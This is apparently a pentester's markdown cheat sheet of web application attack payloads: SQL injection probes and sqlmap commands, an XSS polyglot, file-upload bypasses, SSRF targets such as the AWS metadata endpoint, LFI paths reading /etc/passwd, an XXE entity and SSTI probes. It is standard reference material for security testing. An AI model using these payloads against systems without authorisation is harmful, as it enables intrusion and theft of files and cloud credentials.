# Web Application Attacks

## SQL Injection
### Detection
- `'` - Single quote error
- `' OR 1=1 --` - Boolean-based
- `' UNION SELECT 1,2,3 --` - Union-based
- `sleep(5)` - Time-based (MySQL)
- `pg_sleep(5)` - Time-based (PostgreSQL)
- `WAITFOR DELAY '0:0:5'` - Time-based (MSSQL)

### Automated
- `sqlmap -u <url> --batch --risk=3 --level=5`
- `sqlmap -r request.txt -p parameter --batch`

### Database Detection
- `@@version` - MSSQL
- `version()` - MySQL/PostgreSQL
- `sqlite_version()` - SQLite

## XSS
### Types
- **Reflected**: Appears in URL/response immediately
- **Stored**: Persists in database
- **DOM-based**: Executes via client-side JS

### Polyglot
```
jaVasCript:/*-/*`/*\`/*'/*"/**/(/* */onerror=alert(1) )//%0D%0A%0d%0a//</stYle/</titLe/</teXtarEa/</scRipt/--!>\x3csVg/<sVg/oNloAd=alert(1)//>\x3e
```

## File Upload
- Check for extension bypass: `.php5`, `.phtml`, `.php.jpg`
- Check content-type bypass: `image/png`
- Check for race conditions (upload + access before validation)
- `.htaccess` upload: `AddType application/x-httpd-php .txt`

## SSRF
- `file:///etc/passwd` - Local file read
- `http://169.254.169.254/latest/meta-data/` - AWS metadata
- `gopher://` - Protocol smuggling
- `http://localhost:8080/admin` - Internal service scan

## LFI/RFI
- `../../../../etc/passwd`
- `php://filter/convert.base64-encode/resource=index.php`
- `data://text/plain;base64,...`
- Wrappers: `expect://`, `input://`

## XXE
```xml
<!DOCTYPE foo [<!ENTITY xxe SYSTEM "file:///etc/passwd">]>
<root>&xxe;</root>
```

## SSTI
- `{{7*7}}` - Jinja2 (Python)
- `${{7*7}}` - Mako
- `<%= 7*7 %>` - ERB (Ruby)
- `${7*7}` - Freemarker
